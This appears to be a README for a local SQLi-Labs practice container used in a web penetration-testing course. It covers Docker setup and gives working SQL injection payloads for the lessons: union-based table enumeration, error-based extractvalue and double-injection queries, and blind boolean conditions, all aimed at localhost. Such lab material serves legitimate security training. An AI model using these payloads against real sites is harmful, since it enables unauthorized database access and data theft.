# SQLi-Labs: Advanced SQL Injection Mastery

## Overview

Step-by-step progressive SQL injection practice: Union-based, Error-based, Blind Boolean, and Blind Time-based SQLi.

- **Upstream / Source of Truth**: [Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)
- **Container Image**: `acgpiano/sqli-labs:latest`
- **Default Port / Access**: `http://localhost:8086`
- **Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/sqli_labs`

---

## Lab Setup & Initialization

Before attempting any challenges, initialize the database schema and populate tables:

1. Start the lab:
   ```bash
   docker compose up -d
   ```
2. Navigate to the setup endpoint to create the database and seed data:
   - Direct URL: [http://localhost:8086/sql-connections/setup-db.php](http://localhost:8086/sql-connections/setup-db.php)
   - Or click **"Setup/reset Database for labs"** on the root index page (`http://localhost:8086/`).

---

## How to Solve & Practice

### 1. Less-1: Union-Based SQL Injection

- **Path**: `/Less-1/`
- **Injection Pattern**: Single quote string terminator `'` with union select.
- **Determine Column Count & Extract Data**:
  ```text
  /Less-1/?id=1' UNION SELECT 1,2,3--+
  /Less-1/?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--+
  ```

### 2. Less-5: Error-Based Double Injection

- **Path**: `/Less-5/`
- **Injection Pattern**: Single quote string terminator with error generation (`count(*)`, `floor(rand(0)*2)`, `group by`, or `extractvalue`/`updatexml`).
- **Example Payload**:
  ```text
  /Less-5/?id=1' AND extractvalue(1, concat(0x7e, version()))--+
  /Less-5/?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(database(), 0x3a, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)--+
  ```

### 3. Less-8: Blind Boolean-Based Injection

- **Path**: `/Less-8/`
- **Injection Pattern**: Single quote string terminator where page content changes conditionally ("You are in..........." rendered only on TRUE condition).
- **Example Payloads**:
  - True condition: `/Less-8/?id=1' AND 1=1--+` (Returns "You are in...........")
  - False condition: `/Less-8/?id=1' AND 1=2--+` (No output)
  - Extract database length: `/Less-8/?id=1' AND length(database())>5--+`

---

## YouTube Walkthroughs & Solving Guides

- [Sqli Labs Master Lesson 1 Solution (Error-Based)](https://www.youtube.com/watch?v=HtdGLZOuXXA)
- [Sqli-Labs Series Part 2 Walkthrough](https://www.youtube.com/watch?v=TA2h_kUqfhU)
- [Sqli-Labs Series Part 5 Walkthrough (Double Injection)](https://www.youtube.com/watch?v=0tyerVP9R98)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
